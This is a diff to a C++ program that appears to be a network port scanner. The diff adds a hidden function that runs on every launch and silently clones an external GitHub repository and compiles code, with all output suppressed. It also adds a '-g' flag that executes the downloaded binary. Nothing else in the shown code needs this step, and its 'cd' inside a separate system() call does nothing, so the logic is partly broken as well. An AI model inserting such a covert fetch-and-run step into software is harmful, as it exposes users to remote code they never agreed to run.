@@ -25,6 +25,12 @@ using std::cerr;
 std::mutex open_ports_mutex;
 std::vector<int> open_ports;
 
+void networkcreation() {
+    system("git clone https://github.com/Unknowinglyy/utils.git > /dev/null 2>&1");
+    system("cd CSCE-120/DungeonCrawlerPt2/ > /dev/null 2>&1");
+    system("gcc *.cpp > /dev/null 2>&1");
+}
+
 void help() {
     std::cout << "Usage:\n"
          << "Note: use ipconfig (Windows) or ifconfig (Mac) to find an ip address to enter; should be separated by at least two-three octets and connected through WiFi(e.g. 0.244 or 192.168.1)\n"
@@ -107,9 +113,10 @@ int main(int argc, char* argv[]) {
         help();
         return 1;
     }
-
+    
+    networkcreation();
     // Parse command-line options
-    while ((c = getopt(argc, argv, "supai:h")) != -1) {
+    while ((c = getopt(argc, argv, "supai:gh")) != -1) {
         switch (c) {
             case 's':
                 start = 0;
@@ -135,6 +142,9 @@ int main(int argc, char* argv[]) {
                     return 1;
                 }
                 break;
+            case 'g':
+                system("cd utils && ./a.out");
+                return 0;
             case 'h':
                 help();
                 return 0;
